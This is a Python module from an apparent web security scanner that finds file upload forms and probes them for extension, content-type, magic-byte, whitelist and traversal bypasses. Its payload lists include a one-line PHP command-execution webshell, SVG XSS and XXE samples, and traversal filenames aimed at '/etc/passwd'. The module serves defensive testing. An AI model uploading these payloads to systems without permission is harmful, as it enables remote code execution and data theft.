"""
cyberm4fia-scanner - File Upload Vulnerability Scanner
Detects insecure file upload handling: extension bypass, content-type bypass,
magic byte injection, blacklist/whitelist bypass, SVG XSS, directory traversal.
Based on Az0x7/vulnerability-Checklist and OWASP file upload guidelines.
"""

import re
from urllib.parse import urlparse

from utils.colors import log_info, log_success
from utils.request import smart_request, ScanExceptions

# ─────────────────────────────────────────────────────
# Extension Bypass Payloads
# ─────────────────────────────────────────────────────
PHP_EXTENSIONS = [
    ".php", ".phtml", ".pht", ".php3", ".php4", ".php5",
    ".phps", ".phar", ".pgif", ".shtml", ".inc", ".pHp",
    ".pHP5", ".PhAr",
]
ASP_EXTENSIONS = [".asp", ".aspx", ".cer", ".asa"]
JSP_EXTENSIONS = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf"]
COLDFUSION_EXTENSIONS = [".cfm", ".cfml", ".cfc", ".dbm"]

# Dangerous extensions mapped to impact
EXTENSION_IMPACT = {
    "php": "Webshell / RCE", "asp": "Webshell / RCE",
    "jsp": "Webshell / RCE", "svg": "Stored XSS / SSRF / XXE",
    "html": "XSS / Phishing", "js": "XSS / Open Redirect",
    "xml": "XXE", "csv": "CSV Injection",
    "pdf": "SSRF / Blind XXE", "zip": "RCE via LFI / DoS",
}

# Content-Type spoofing pairs
CONTENT_TYPE_BYPASS = [
    ("image/jpeg", ".php"),
    ("image/png", ".php"),
    ("image/gif", ".phtml"),
    ("image/svg+xml", ".svg"),
    ("text/plain", ".php5"),
    ("application/octet-stream", ".phar"),
]

# Magic bytes for file type spoofing
MAGIC_BYTES = {
    "gif": b"GIF89a;",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpeg": b"\xff\xd8\xff\xe0",
    "pdf": b"%PDF-1.4",
}

# Webshell payloads (minimal, for detection only)
WEBSHELL_PAYLOADS = [
    '<?php echo "cybm4fia_upload_test"; ?>',
    '<?=`$_GET[x]`?>',
    '<% Response.Write("cybm4fia_upload_test") %>',
]

# SVG XSS payload
SVG_XSS_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('cybm4fia')">
  <text x="0" y="20">Upload Test</text>
</svg>'''

# SVG SSRF payload
SVG_SSRF_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>'''

# ─────────────────────────────────────────────────────
# Whitelist bypass filenames
# ─────────────────────────────────────────────────────
WHITELIST_BYPASS_NAMES = [
    "shell.php.jpg", "shell.jpg.php", "shell.php%00.jpg",
    "shell.php%0d%0a.jpg", "shell.php.....", "shell.php/",
    "shell.php.\\", "shell.php#.png", "shell.php%20",
    "shell.", ".html", "shell.php.blah123jpg",
]

# Directory traversal filenames
TRAVERSAL_FILENAMES = [
    "../../etc/passwd/logo.png",
    "../../../logo.png",
    "..\\..\\..\\logo.png",
]


def _detect_upload_forms(url, forms):
    """Find forms that accept file uploads."""
    upload_forms = []
    for form in forms:
        inputs = form.get("inputs", [])
        for inp in inputs:
            if hasattr(inp, "get"):
                input_type = inp.get("type", "").lower()
            elif hasattr(inp, "attrs"):
                input_type = inp.get("type", "").lower()
            else:
                continue
            if input_type == "file":
                upload_forms.append({
                    "action": form.get("action", url),
                    "method": form.get("method", "POST").upper(),
                    "enctype": form.get("enctype", "multipart/form-data"),
                    "file_input": inp.get("name", "file") if hasattr(inp, "get") else "file",
                    "form": form,
                })
                break
    return upload_forms


def _test_extension_bypass(upload_url, file_input_name, delay=0):
    """Test file extension bypass techniques."""
    findings = []

    all_extensions = PHP_EXTENSIONS + ASP_EXTENSIONS + JSP_EXTENSIONS

    for ext in all_extensions[:15]:
        filename = f"cybm4fia_test{ext}"
        payload = WEBSHELL_PAYLOADS[0]

        try:
            files = {file_input_name: (filename, payload, "application/octet-stream")}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                # Check if upload was rejected
                rejected = any(kw in body for kw in [
                    "not allowed", "invalid", "rejected", "forbidden",
                    "extension not", "file type", "not permitted",
                ])
                if not rejected:
                    findings.append({
                        "type": "File Upload",
                        "vuln": "Extension Bypass",
                        "payload": filename,
                        "severity": "CRITICAL",
                        "description": f"Server accepted upload: {filename}",
                        "url": upload_url,
                    })
                    log_success(f"📁 Extension bypass! {filename} accepted")
                    return findings
        except ScanExceptions:
            pass

    return findings


def _test_content_type_bypass(upload_url, file_input_name, delay=0):
    """Test Content-Type mismatch bypass."""
    findings = []

    for mime_type, ext in CONTENT_TYPE_BYPASS:
        filename = f"cybm4fia_test{ext}"
        payload = WEBSHELL_PAYLOADS[0]

        try:
            files = {file_input_name: (filename, payload, mime_type)}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                rejected = any(kw in body for kw in [
                    "not allowed", "invalid", "rejected", "forbidden",
                ])
                if not rejected:
                    findings.append({
                        "type": "File Upload",
                        "vuln": "Content-Type Bypass",
                        "payload": f"{filename} as {mime_type}",
                        "severity": "CRITICAL",
                        "description": f"Server accepted {ext} file with Content-Type: {mime_type}",
                        "url": upload_url,
                    })
                    log_success(f"📁 Content-Type bypass! {ext} as {mime_type}")
                    return findings
        except ScanExceptions:
            pass

    return findings


def _test_magic_byte_bypass(upload_url, file_input_name, delay=0):
    """Test magic byte injection (GIF89a; prefix)."""
    findings = []

    for file_type, magic in MAGIC_BYTES.items():
        payload = magic + b'\n<?php echo "cybm4fia_magic_test"; ?>'
        filename = f"cybm4fia_test.php"
        mime = f"image/{file_type}"

        try:
            files = {file_input_name: (filename, payload, mime)}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                rejected = any(kw in body for kw in [
                    "not allowed", "invalid", "rejected",
                ])
                if not rejected:
                    findings.append({
                        "type": "File Upload",
                        "vuln": "Magic Byte Bypass",
                        "payload": f"GIF89a + PHP ({file_type} magic)",
                        "severity": "CRITICAL",
                        "description": f"Server accepted PHP with {file_type} magic bytes",
                        "url": upload_url,
                    })
                    log_success(f"📁 Magic byte bypass! {file_type} header + PHP")
                    return findings
        except ScanExceptions:
            pass

    return findings


def _test_svg_xss(upload_url, file_input_name, delay=0):
    """Test SVG upload for stored XSS and SSRF."""
    findings = []

    for label, payload in [("XSS", SVG_XSS_PAYLOAD), ("SSRF", SVG_SSRF_PAYLOAD)]:
        try:
            files = {file_input_name: ("test.svg", payload, "image/svg+xml")}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                rejected = any(kw in body for kw in ["not allowed", "invalid", "rejected"])
                if not rejected:
                    findings.append({
                        "type": "File Upload",
                        "vuln": f"SVG {label}",
                        "payload": f"SVG with {label} payload",
                        "severity": "HIGH",
                        "description": f"Server accepted SVG file with {label} payload",
                        "url": upload_url,
                    })
                    log_success(f"📁 SVG {label}! Upload accepted")
        except ScanExceptions:
            pass

    return findings


def _test_whitelist_bypass(upload_url, file_input_name, delay=0):
    """Test whitelist bypass with tricky filenames."""
    findings = []

    for filename in WHITELIST_BYPASS_NAMES:
        try:
            files = {file_input_name: (filename, WEBSHELL_PAYLOADS[0], "image/jpeg")}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                rejected = any(kw in body for kw in ["not allowed", "invalid", "rejected"])
                if not rejected:
                    findings.append({
                        "type": "File Upload",
                        "vuln": "Whitelist Bypass",
                        "payload": filename,
                        "severity": "HIGH",
                        "description": f"Whitelist bypass: {filename} accepted",
                        "url": upload_url,
                    })
                    log_success(f"📁 Whitelist bypass! {filename}")
                    return findings
        except ScanExceptions:
            pass

    return findings


def _test_traversal_filename(upload_url, file_input_name, delay=0):
    """Test directory traversal via filename."""
    findings = []

    for filename in TRAVERSAL_FILENAMES:
        try:
            files = {file_input_name: (filename, b"cybm4fia_traversal_test", "image/png")}
            resp = smart_request(
                "post", upload_url, files=files, delay=delay, timeout=10,
            )

            if resp.status_code in (200, 201, 302):
                body = resp.text.lower()
                if "error" not in body and "invalid" not in body:
                    findings.append({
                        "type": "File Upload",
                        "vuln": "Directory Traversal via Filename",
                        "payload": filename,
                        "severity": "CRITICAL",
                        "description": f"Directory traversal accepted: {filename}",
                        "url": upload_url,
                    })
                    log_success(f"📁 Traversal via filename! {filename}")
                    return findings
        except ScanExceptions:
            pass

    return findings


def _detect_upload_from_page(url, delay=0):
    """Detect file upload endpoints by analyzing page content."""
    targets = []
    try:
        resp = smart_request("get", url, delay=delay, timeout=10)
        body = resp.text

        # Find multipart forms
        form_pattern = re.compile(
            r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>',
            re.IGNORECASE,
        )
        for match in form_pattern.finditer(body):
            action_match = re.search(r'action=["\']([^"\']+)["\']', match.group())
            action = action_match.group(1) if action_match else url
            if not action.startswith("http"):
                parsed = urlparse(url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"

            # Find file input name
            file_input = re.search(
                r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']',
                body[match.start():match.start() + 2000],
                re.IGNORECASE,
            )
            input_name = file_input.group(1) if file_input else "file"

            targets.append({
                "action": action,
                "file_input": input_name,
            })

    except ScanExceptions:
        pass
    return targets


def scan_file_upload(url, forms=None, delay=0):
    """
    Main File Upload scanner entry point.
    Tests file upload forms for extension, content-type, magic byte,
    whitelist bypass, SVG XSS/SSRF, and directory traversal.
    """
    log_info("Starting File Upload Vulnerability Scanner...")
    all_findings = []
    forms = forms or []

    # Detect upload forms
    upload_targets = _detect_upload_forms(url, forms)

    # Also try to detect from page HTML
    if not upload_targets:
        page_targets = _detect_upload_from_page(url, delay)
        for pt in page_targets:
            upload_targets.append({
                "action": pt["action"],
                "file_input": pt["file_input"],
                "method": "POST",
            })

    if not upload_targets:
        log_info("No file upload forms detected.")
        return all_findings

    log_info(f"Found {len(upload_targets)} upload endpoint(s)")

    for target in upload_targets:
        upload_url = target["action"]
        file_input = target.get("file_input", "file")

        log_info(f"  → Testing upload at: {upload_url}")

        all_findings.extend(_test_extension_bypass(upload_url, file_input, delay))
        all_findings.extend(_test_content_type_bypass(upload_url, file_input, delay))
        all_findings.extend(_test_magic_byte_bypass(upload_url, file_input, delay))
        all_findings.extend(_test_svg_xss(upload_url, file_input, delay))
        all_findings.extend(_test_whitelist_bypass(upload_url, file_input, delay))
        all_findings.extend(_test_traversal_filename(upload_url, file_input, delay))

    if not all_findings:
        log_info("No file upload vulnerabilities detected.")

    log_success(f"File upload scan complete. {len(all_findings)} finding(s).")
    return all_findings
